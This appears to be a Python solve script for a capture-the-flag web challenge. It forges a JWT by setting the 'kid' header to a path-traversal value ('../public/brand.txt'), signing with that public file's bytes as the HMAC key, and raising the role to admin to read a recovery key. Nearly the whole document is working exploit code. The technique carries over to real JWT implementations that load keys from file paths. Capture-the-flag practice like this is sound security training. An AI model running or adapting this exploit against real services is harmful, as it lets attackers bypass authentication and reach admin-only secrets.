#!/usr/bin/env python3
"""Vardanne Command -- JWT HS256 `kid` key-injection.

The console loads each token's HMAC signing key by its `kid` header. A public
brand asset (/public/brand.txt) has knowable bytes, so point `kid` at it and
sign with those bytes -> a self-forged token the console verifies. Flip role to
admin (keeping the issued subject) and read the admin-only recovery key.

stdlib only. Usage: python solve.py http://HOST:PORT
"""
import base64
import hashlib
import hmac
import json
import sys
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w03.ctf.chronos-security.ro:33157").rstrip("/")
ASSET = "/public/brand.txt"          # public asset reused as the HMAC key
KID = "../public/brand.txt"          # kid resolves under a keystore dir; `..` reaches the served asset


def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.status, r.read()


def b64(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def main():
    # issued subject (admin route requires the issued subject + role=admin)
    _, tok = get("/token")
    sub = json.loads(tok)["sub"]
    print("[*] issued subject:", sub)

    # exact bytes of the public asset = the HMAC key
    _, key = get(ASSET)
    print("[*] key source %s (%d bytes)" % (ASSET, len(key)))

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT", "kid": KID},
                            separators=(",", ":")).encode())
    payload = b64(json.dumps({"sub": sub, "role": "admin"},
                             separators=(",", ":")).encode())
    sig = b64(hmac.new(key, header + b"." + payload, hashlib.sha256).digest())
    token = (header + b"." + payload + b"." + sig).decode()

    status, body = get("/admin/recovery-key",
                       {"Authorization": "Bearer " + token})
    print("[*] /admin/recovery-key ->", status)
    print(body.decode(errors="replace"))
    try:
        rk = json.loads(body).get("recovery_key", "")
        if "CSCTF{" in rk:
            print("\n[+] FLAG:", rk)
    except Exception:
        pass


if __name__ == "__main__":
    main()
